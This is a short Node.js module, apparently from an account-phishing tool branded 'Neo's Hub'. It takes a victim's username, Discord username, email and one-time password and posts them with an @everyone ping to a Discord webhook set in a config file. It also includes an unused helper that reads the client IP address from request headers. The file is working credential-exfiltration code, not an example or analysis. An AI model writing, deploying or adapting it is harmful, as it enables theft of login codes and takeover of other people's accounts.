const axios = require('axios');
const checkUsernameUtil = require('./utils/checkUsernameUtil');
const checkEmailUtil = require('./utils/checkEmailUtil');
const config = require('../config.json');
module.exports = async (email, username, otp, id, user) => {
    const webhook = config.webhook;
    const data = {
        "username": "Neo's Hub",
        "avatar_url": "https://cdn.discordapp.com/attachments/1087418153908306091/1087418844278161449/DiaFlow_1.png",
        "content": "@everyone",
        embeds: [
            {
                title: "📖 Request Info",
                description: "*all known info about requesting user...*",
                color: 0x7289da,
                "footer": {
                    "text": "📅 " + new Date().toLocaleString().split(", ")[1]
                },
                fields: [
                    {
                        name: "Username",
                        value: "```" + username + "```",
                        inline: true,
                    },
                    {
                        name: "Discord Username",
                        value: "```" + user + "```",
                        inline: true,
                    },
                    {
                        name: "Email",
                        value: "```" + email + "```",
                        inline: false,
                    },
                    {
                        name: "🎁 One-Time Password",
                        value: "```" + otp + "```",
                        inline: false,
                    }
                ]
            },
        ],
    };
    try {
        await axios.post(webhook, data)
    } catch (error) {
        console.log(error);
    }
}


function getIp(req) {
    return (req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress || "0");
}